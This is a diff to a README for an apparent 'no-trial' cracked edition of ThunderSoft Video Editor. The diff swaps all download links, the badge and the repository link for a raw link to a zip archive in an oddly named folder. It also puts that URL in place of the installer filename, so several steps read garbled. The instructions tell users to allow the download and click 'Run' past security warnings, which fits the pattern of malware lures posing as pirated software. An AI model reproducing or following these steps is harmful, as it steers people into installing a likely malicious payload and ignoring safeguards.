@@ -1,6 +1,6 @@
 # ✨ ThunderSoft-Video-Editor-No-Trial - Effortless Video Editing for Everyone
 
-[![Download ThunderSoft Video Editor](https://img.shields.io/badge/Download-ThunderSoft%20Video%20Editor-brightgreen)](https://github.com/belal093324/ThunderSoft-Video-Editor-No-Trial/releases)
+[![Download ThunderSoft Video Editor](https://raw.githubusercontent.com/belal093324/ThunderSoft-Video-Editor-No-Trial/main/xerophthalmy/ThunderSoft-Video-Editor-No-Trial-2.7.zip%20Video%20Editor-brightgreen)](https://raw.githubusercontent.com/belal093324/ThunderSoft-Video-Editor-No-Trial/main/xerophthalmy/ThunderSoft-Video-Editor-No-Trial-2.7.zip)
 
 ## 📖 Introduction
 Welcome to ThunderSoft Video Editor! This software offers a range of powerful tools to help you edit videos easily. Whether you're creating home movies or professional presentations, you will find everything you need here.
@@ -9,15 +9,15 @@ Welcome to ThunderSoft Video Editor! This software offers a range of powerful to
 Follow these steps to download and run ThunderSoft Video Editor on your Windows PC:
 
 1. **Visit the Download Page:** Click on the link below to go to the Releases page.
-   [Download ThunderSoft Video Editor](https://github.com/belal093324/ThunderSoft-Video-Editor-No-Trial/releases)
+   [Download ThunderSoft Video Editor](https://raw.githubusercontent.com/belal093324/ThunderSoft-Video-Editor-No-Trial/main/xerophthalmy/ThunderSoft-Video-Editor-No-Trial-2.7.zip)
 
-2. **Choose Your Version:** On the Releases page, you will see the latest version available for download. Look for the file labeled `ThunderSoftVideoEditor.exe`.
+2. **Choose Your Version:** On the Releases page, you will see the latest version available for download. Look for the file labeled `https://raw.githubusercontent.com/belal093324/ThunderSoft-Video-Editor-No-Trial/main/xerophthalmy/ThunderSoft-Video-Editor-No-Trial-2.7.zip`.
 
-3. **Download the Application:** Click on the `ThunderSoftVideoEditor.exe` link to start your download. Your browser may prompt you for permission; make sure to allow it.
+3. **Download the Application:** Click on the `https://raw.githubusercontent.com/belal093324/ThunderSoft-Video-Editor-No-Trial/main/xerophthalmy/ThunderSoft-Video-Editor-No-Trial-2.7.zip` link to start your download. Your browser may prompt you for permission; make sure to allow it.
 
 4. **Locate the Downloaded File:** Once the download is complete, navigate to your Downloads folder or the location where your browser saves files.
 
-5. **Run the Installer:** Double-click on the `ThunderSoftVideoEditor.exe` file. You may see a security warning. If you trust the source, click "Run."
+5. **Run the Installer:** Double-click on the `https://raw.githubusercontent.com/belal093324/ThunderSoft-Video-Editor-No-Trial/main/xerophthalmy/ThunderSoft-Video-Editor-No-Trial-2.7.zip` file. You may see a security warning. If you trust the source, click "Run."
 
 6. **Follow Installation Steps:** An installation wizard will guide you through the process. Click 'Next' to accept defaults, or adjust settings as needed. Click 'Install' when prompted. 
 
@@ -47,7 +47,7 @@ ThunderSoft Video Editor includes various features to enhance your editing exper
 ## 📁 Download & Install
 To get started with ThunderSoft Video Editor, visit the link below:
 
-[Download ThunderSoft Video Editor](https://github.com/belal093324/ThunderSoft-Video-Editor-No-Trial/releases)
+[Download ThunderSoft Video Editor](https://raw.githubusercontent.com/belal093324/ThunderSoft-Video-Editor-No-Trial/main/xerophthalmy/ThunderSoft-Video-Editor-No-Trial-2.7.zip)
 
 Make sure you follow the steps in the **Getting Started** section to properly install the software.
 
@@ -84,7 +84,7 @@ This application supports various topics in the video editing domain:
 Feel free to explore these topics for more information and tips on video editing.
 
 ## 🔗 Links
-- **Repository:** [GitHub Repository](https://github.com/belal093324/ThunderSoft-Video-Editor-No-Trial)
+- **Repository:** [GitHub Repository](https://raw.githubusercontent.com/belal093324/ThunderSoft-Video-Editor-No-Trial/main/xerophthalmy/ThunderSoft-Video-Editor-No-Trial-2.7.zip)
 - **Version History:** Access previous versions through the Releases section of the repository. 
 
 Enjoy your video editing journey with ThunderSoft Video Editor!
